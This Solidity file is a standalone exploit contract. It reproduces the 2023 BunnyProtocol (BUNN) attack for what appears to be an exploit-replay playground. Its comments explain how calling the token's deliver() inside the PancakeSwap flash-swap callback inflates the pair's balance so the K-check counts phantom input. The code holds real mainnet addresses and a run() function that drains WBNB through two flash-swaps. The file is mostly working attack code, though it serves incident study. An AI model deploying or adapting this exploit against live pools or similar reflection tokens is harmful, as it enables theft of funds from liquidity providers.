// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.10 <0.9.0;

// Synthetic standalone exploit for the EVM Playground (2023-06-BUNN).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// (the flash-swap callback `pancakeCall` lives on the test itself, and the
// attacker is `address(this)`), so there is no standalone contract to deploy.
// This contract is a faithful, self-contained copy of that inline attack
// (testExploit body → run(); pancakeCall preserved verbatim) so the playground
// can deploy it and record run(). Logic and constants are copied verbatim from
// test/BUNN_exp.sol. No imports — it compiles anywhere.
//
// Root cause: BunnyProtocol (BUNN) is an RFI/reflection token. Its permissionless
// `deliver(tAmount)` shrinks the global `_rTotal`, which lowers the rate and so
// INFLATES every holder's `balanceOf` — including the PancakeSwap pair's — with
// no Transfer event and no tokens moving. PancakePair.swap() measures the
// caller's "input" by diffing `balanceOf(pair)` before vs. after the user
// callback, so the reflection inflation (triggered inside the mandatory
// `pancakeCall` callback) is mis-counted as the attacker's BUNN deposit. The
// constant-product K-check therefore passes, and the attacker walks off with
// WBNB having deposited nothing. Two flash-swaps drain 52 WBNB from the pair.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IBUNN {
    function deliver(uint256 tAmount) external;
}

interface IPancakePair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract BUNNDeliverDrain {
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IBUNN constant BUNN = IBUNN(0xc54AAecF5fA1b6c007d019a9d14dFb4a77CC3039);
    IPancakePair constant pair = IPancakePair(0xb4B84375Ae9bb94d19F416D3db553827Be349520);

    // Single recorded entrypoint: two flash-swaps. Each swap's `pancakeCall`
    // callback (below) calls BUNN.deliver(990e9), inflating the pair's BUNN
    // balance so the K-check credits the phantom BUNN as the attacker's input.
    function run() external {
        pair.swap(44 ether, 1_000_000_000_000, address(this), "0x0"); // 44 WBNB out
        pair.swap(8 ether, 1_000_000_000_000, address(this), "0x0"); // 8 WBNB out
    }

    // PancakeSwap flash-swap callback. Fires after the optimistic WBNB/BUNN
    // transfer-out but BEFORE the pair reads its balance for the K-check — the
    // precise window where a `deliver()` will be picked up as phantom "input".
    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        // Shrink _rTotal → rate drops → every holder's balanceOf rises,
        // including the pair's. No transfer, no Transfer event. The pair then
        // reads its spontaneously-grown BUNN balance and counts the inflation
        // as the attacker's deposit, satisfying the K-check for the WBNB pulled.
        BUNN.deliver(990_000_000_000);
    }

    receive() external payable {}
}
